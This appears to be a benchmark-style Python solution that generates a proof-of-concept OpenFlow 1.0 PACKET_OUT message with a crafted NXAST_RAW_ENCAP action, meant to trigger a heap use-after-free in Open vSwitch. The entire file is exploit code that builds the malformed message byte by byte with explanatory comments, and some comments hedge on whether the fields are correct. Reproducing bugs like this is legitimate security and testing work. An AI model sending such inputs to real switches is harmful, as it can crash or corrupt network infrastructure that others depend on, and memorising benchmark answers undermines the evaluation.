import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in OVS NXAST_RAW_ENCAP decoding.
        The PoC is an OpenFlow 1.0 PACKET_OUT message containing a specific NXAST_RAW_ENCAP action.
        """
        # OpenFlow 1.0 Header (8 bytes)
        # Version: 1 (OFP 1.0)
        # Type: 13 (OFPT_PACKET_OUT)
        # Length: 72 (Total length of the message)
        # XID: 0 (Transaction ID)
        of_header = struct.pack('!BBHI', 1, 13, 72, 0)
        
        # PACKET_OUT Body (8 bytes)
        # Buffer ID: 0xffffffff (OFP_NO_BUFFER)
        # In Port: 0xfffd (OFPP_CONTROLLER)
        # Actions Length: 56 bytes
        po_body = struct.pack('!IHH', 0xffffffff, 0xfffd, 56)
        
        # NXAST_RAW_ENCAP Action (56 bytes total)
        # Action Header (12 bytes)
        # Type: 0xffff (OFPAT_VENDOR)
        # Length: 56
        # Vendor: 0x00002320 (NX_VENDOR_ID)
        # Subtype: 46 (NXAST_ENCAP / RAW_ENCAP)
        # Packet Type: 0
        action_hdr = struct.pack('!HHIHH', 0xffff, 56, 0x00002320, 46, 0)
        
        # Encap Property (44 bytes total)
        # Header (4 bytes)
        # Type: 1 (Likely valid type, e.g. NX_ENCAP_PROP_L2)
        # Length: 44 (Size including header)
        prop_hdr = struct.pack('!HH', 1, 44)
        
        # Property Data (40 bytes)
        # Arbitrary payload to fill the size and potentially trigger buffer reallocation logic
        prop_data = b'\x41' * 40
        
        return of_header + po_body + action_hdr + prop_hdr + prop_data